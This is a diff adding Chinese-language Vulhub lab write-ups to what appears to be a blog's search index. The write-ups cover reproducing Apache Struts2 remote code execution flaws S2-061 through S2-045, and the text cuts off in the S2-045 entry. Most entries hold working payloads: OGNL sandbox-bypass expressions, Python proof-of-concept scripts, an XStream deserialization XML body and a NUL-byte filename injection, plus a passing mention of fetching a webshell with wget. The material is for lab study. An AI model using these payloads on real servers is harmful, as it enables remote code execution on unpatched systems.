@@ -17,6 +17,581 @@
       </tags>
   </entry>
   <entry>
+    <title>Struts2 S2-061 远程代码执行漏洞 (CVE-2020-17530)</title>
+    <url>/2022/02/18/S2-061/</url>
+    <content><![CDATA[<h1 id="Struts2-S2-061-远程代码执行漏洞-CVE-2020-17530"><a href="#Struts2-S2-061-远程代码执行漏洞-CVE-2020-17530" class="headerlink" title="Struts2 S2-061 远程代码执行漏洞 (CVE-2020-17530)"></a>Struts2 S2-061 远程代码执行漏洞 (CVE-2020-17530)</h1><p>在 Struts 2.5.25 之前的版本中，当对标签属性中的原始用户输入进行评估时，可能会导致远程代码执行。</p>
+<p>此漏洞是绕过 OGNL 沙箱，在 S2-059 之后增强。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-061" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-061</a></li>
+<li><a href="https://github.com/ka1n4t/CVE-2020-17530" target="_blank" rel="noopener">https://github.com/ka1n4t/CVE-2020-17530</a></li>
+<li><a href="https://www.anquanke.com/post/id/225252" target="_blank" rel="noopener">https://www.anquanke.com/post/id/225252</a></li>
+<li><a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动一个 Struts 2.5.25 服务器：环境启动后，访问<code>http://192.168.44.132:8080/</code>，会看到一个简单的页面。它只是<a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-059" target="_blank" rel="noopener">S2-059</a>的一个复制应用程序，除了不同的 Struts 版本。</p>
+<p>发送以下请求以执行<code>id</code>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 829</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该<code>id</code>命令的结果会显示在页面上：</p>
+<p><img src="https://image.3001.net/images/20220218/16451654972298.png" alt="image-20220218140323275"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)</title>
+    <url>/2022/02/18/S2-059/</url>
+    <content><![CDATA[<h1 id="Struts2-S2-059-远程代码执行漏洞-CVE-2019-0230"><a href="#Struts2-S2-059-远程代码执行漏洞-CVE-2019-0230" class="headerlink" title="Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)"></a>Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)</h1><p>Apache Struts 框架在强制执行时对分配给某些标签属性（例如 id）的属性值执行双重评估，因此可以传入一个值，该值将在渲染标签的属性时再次评估。通过精心设计的请求，这可能会导致远程代码执行 (RCE)。</p>
+<p>受影响的版本：Struts 2.0.0 - Struts 2.5.20</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-059" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-059</a></li>
+<li><a href="https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776" target="_blank" rel="noopener">https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080/?id=1</code>，会看到Struts2测试页面。</p>
+<p>访问<code>http://192.168.44.132:8080/?id=%25%7B7*7%7D</code>，可以看到在id属性中已经返回了7*7的结果。</p>
+<p><img src="https://image.3001.net/images/20220218/16451654223938.png" alt="image-20220218110635826"></p>
+<p><a href="https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776" target="_blank" rel="noopener">OGNL Apache Struts 漏洞利用：武器化沙箱绕过 (CVE-2018-11776)</a>提供了 Struts 2.5.16 中 OGNL 沙箱绕过的详细信息。</p>
+<p>用于验证漏洞的简单 Python POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;</span><br><span class="line">data1 &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;: &quot;%&#123;(#context&#x3D;#attr[&#39;struts.valueStack&#39;].context).(#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#39;&#39;)).(#ognlUtil.setExcludedPackageNames(&#39;&#39;))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data2 &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;: &quot;%&#123;(#context&#x3D;#attr[&#39;struts.valueStack&#39;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;touch &#x2F;tmp&#x2F;success&#39;))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">res1 &#x3D; requests.post(url, data&#x3D;data1)</span><br><span class="line"># print(res1.text)</span><br><span class="line">res2 &#x3D; requests.post(url, data&#x3D;data2)</span><br><span class="line"># print(res2.text)</span><br></pre></td></tr></table></figure>
+
+<p>执行poc，<code>touch /tmp/success</code>命令已执行：</p>
+<p><img src="https://image.3001.net/images/20220218/16451654276298.png" alt="image-20220218112227601"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 S2-057 远程代码执行漏洞 (CVE-2018-11776)</title>
+    <url>/2022/02/18/S2-057/</url>
+    <content><![CDATA[<h1 id="Struts2-S2-057-远程代码执行漏洞-CVE-2018-11776"><a href="#Struts2-S2-057-远程代码执行漏洞-CVE-2018-11776" class="headerlink" title="Struts2 S2-057 远程代码执行漏洞 (CVE-2018-11776)"></a>Struts2 S2-057 远程代码执行漏洞 (CVE-2018-11776)</h1><p>受影响的版本：&lt;= Struts 2.3.34、Struts 2.5.16</p>
+<p>细节：</p>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-057" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-057</a></li>
+<li><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></li>
+<li><a href="https://xz.aliyun.com/t/2618" target="_blank" rel="noopener">https://xz.aliyun.com/t/2618</a></li>
+<li><a href="https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动 Struts 2.3.34 环境，环境启动后，访问<code>http://192.168.44.132:8080/showcase/</code>，会看到Struts2测试页面。</p>
+<p>S2-057 需要以下条件：</p>
+<p> -<code>alwaysSelectFullNamespace</code>为真 - 操作元素没有设置命名空间属性，或者使用了通配符</p>
+<p>命名空间会被用户从uri传递过来，解析为OGNL表达式，最终导致远程代码执行漏洞。</p>
+<p>有效载荷：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;struts2-showcase&#x2F;$%7B7*7%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451652496300.png" alt="image-20220218102237770"></p>
+<p>可以看到Location头中已经返回了7*7的结果。</p>
+<p>使用来自<a href="https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg" target="_blank" rel="noopener">S2-057 漏洞分析和 POC</a>的有效负载：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[&#39;struts.valueStack&#39;].context).(#cr&#x3D;#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="https://image.3001.net/images/20220218/16451652536602.png" alt="image-20220218104419966"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-053 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-053/</url>
+    <content><![CDATA[<h1 id="S2-053-远程代码执行漏洞"><a href="#S2-053-远程代码执行漏洞" class="headerlink" title="S2-053 远程代码执行漏洞"></a>S2-053 远程代码执行漏洞</h1><p>受影响的版本：Struts 2.0.1 - Struts 2.3.33、Struts 2.5 - Struts 2.5.10</p>
+<p>细节：</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-053.html</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&amp;mid=2247483663&amp;idx=1&amp;sn=6304e1469f23c33728ab5c73692b675e" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&amp;mid=2247483663&amp;idx=1&amp;sn=6304e1469f23c33728ab5c73692b675e</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问 即可看到提交页面<code>http://192.168.44.132:8080/hello.action</code>。</p>
+<p>Struts2 允许在使用 Freemarker 模板引擎时解析 OGNL 表达式。数据不是OGNL自己解析的，而是Freemarker解析一次之后。变成了表达式，被OGNL第二次解析。和远程代码执行漏洞。</p>
+<p>有效载荷：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451652193768.png" alt="image-20220217165154665"></p>
+<p>PS：有人说无法重现漏洞。经过我的测试，发现上面Payload末尾的<strong>换行符</strong>是不能掉的（即payload后面必须跟换行符）。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-052 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-052/</url>
+    <content><![CDATA[<h1 id="S2-052-远程代码执行漏洞"><a href="#S2-052-远程代码执行漏洞" class="headerlink" title="S2-052 远程代码执行漏洞"></a>S2-052 远程代码执行漏洞</h1><p>受影响的版本：Struts 2.1.2 - Struts 2.3.33、Struts 2.5 - Struts 2.5.12</p>
+<p>细节：</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-052.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-052.html</a></li>
+<li><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="noopener">https://yq.aliyun.com/articles/197926</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动环境后，访问<code>http://192.168.44.132:8080/orders.xhtml</code>以查看展示页面。我们需要修改<code>orders.xhtml</code>to<code>order.xml</code>或修改<code>Content-Type</code>header 以<code>application/xml</code>在 body 中传递 XML 数据。</p>
+<p>所以，包是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;orders&#x2F;3&#x2F;edit HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 2415</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt;touch&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;string&gt;&#x2F;tmp&#x2F;success&lt;&#x2F;string&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451651543632.png" alt="image-20220217141730105"></p>
+<p>如果数据包被执行，文件<code>/tmp/success</code>将在 docker 容器中创建。我们执行<code>docker-compose exec struts2 ls /tmp/</code>，我们可以看到<code>success</code>。</p>
+<p><img src="https://image.3001.net/images/20220218/16451651574625.png" alt="image-20220217141742586"></p>
+<p>另外，还可以通过wget下载一个jspx的webshell。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-048 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-048/</url>
+    <content><![CDATA[<h1 id="S2-048-远程代码执行漏洞"><a href="#S2-048-远程代码执行漏洞" class="headerlink" title="S2-048 远程代码执行漏洞"></a>S2-048 远程代码执行漏洞</h1><p>受影响的版本：2.0.0 - 2.3.32</p>
+<p>细节：</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-048.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-048.html</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/4078.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4078.html</a></li>
+<li>[<a href="http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/07/08/S2-048" target="_blank" rel="noopener">http://xxlegend.com/2017/07/08/S2-048</a> 动态分析/)</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这个环境是一个struts-2.3.32 的展示，在tomcat-8.5 中。环境运行后，访问<code>http://192.168.44.132:8080/showcase/</code>查看struts2 show。</p>
+<p>访问集成/Struts 1 集成：</p>
+<p><img src="https://image.3001.net/images/20220218/16451650983749.png" alt="image-20220211155825843"></p>
+<p>OGNL 表达式漏洞位置是<code>Gangster Name</code>表格。</p>
+<p>回车<code>${7*7}</code>查看执行结果：</p>
+<p><img src="https://image.3001.net/images/20220218/16451651034042.png" alt="image-20220211155856240"></p>
+<p>参考 S2-045 的沙箱绕过方法，这是我的 POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451651073823.png" alt="image-20220211155948367"></p>
+<p>当然也可以直接使用s2-045的POC（需要Burpsuite）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451651155195.png" alt="image-20220217111849796"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-046 远程代码执行漏洞（CVE-2017-5638）</title>
+    <url>/2022/02/18/S2-046/</url>
+    <content><![CDATA[<h1 id="S2-046-远程代码执行漏洞（CVE-2017-5638）"><a href="#S2-046-远程代码执行漏洞（CVE-2017-5638）" class="headerlink" title="S2-046 远程代码执行漏洞（CVE-2017-5638）"></a>S2-046 远程代码执行漏洞（CVE-2017-5638）</h1><p>受影响的版本：Struts 2.3.5 - Struts 2.3.31、Struts 2.5 - Struts 2.5.10</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-046" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-046</a></li>
+<li><a href="https://xz.aliyun.com/t/221" target="_blank" rel="noopener">https://xz.aliyun.com/t/221</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>容器运行后，访问<code>http://192.168.44.132:8080</code>可以看到上传页面的示例。</p>
+<p>与 S2-045 相同，S2-046 也是 OGNL 注入，但发生在上传请求的文件名字段，需要一个 NUL 字节来拆分有效负载和剩余的字符串。</p>
+<p>用于验证漏洞的简单 Python POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">q &#x3D; b&#39;&#39;&#39;------WebKitFormBoundaryXd004BVJN9pBYBL2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,7*7)&#125;\x00b&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">foo</span><br><span class="line">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#39;&#39;&#39;.replace(b&#39;\n&#39;, b&#39;\r\n&#39;)</span><br><span class="line">p &#x3D; b&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;56.0.2924.87 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.8,es;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXd004BVJN9pBYBL2</span><br><span class="line">Content-Length: %d</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;.replace(b&#39;\n&#39;, b&#39;\r\n&#39;) % (len(q), )</span><br><span class="line"></span><br><span class="line">with socket.create_connection((&#39;192.168.44.132&#39;, &#39;8080&#39;), timeout&#x3D;5) as conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    print(conn.recv(10240).decode())</span><br></pre></td></tr></table></figure>
+
+<p><code>7*7</code>已成功执行：</p>
+<p><img src="https://image.3001.net/images/20220218/16451650498606.png" alt="image-20220211151343524"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-045 远程代码执行漏洞（CVE-2017-5638）</title>
+    <url>/2022/02/18/S2-045/</url>
+    <content><![CDATA[<h1 id="S2-045-远程代码执行漏洞（CVE-2017-5638）"><a href="#S2-045-远程代码执行漏洞（CVE-2017-5638）" class="headerlink" title="S2-045 远程代码执行漏洞（CVE-2017-5638）"></a>S2-045 远程代码执行漏洞（CVE-2017-5638）</h1><p>受影响的版本：Struts 2.3.5 - Struts 2.3.31、Struts 2.5 - Struts 2.5.10</p>
+<p>参考：</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-045.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-045.html</a></li>
+<li><a href="https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/" target="_blank" rel="noopener">https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>容器运行后，访问<code>http://192.168.44.132:8080</code>可以看到上传页面的示例。</p>
+<p>通过以下请求验证漏洞：</p>
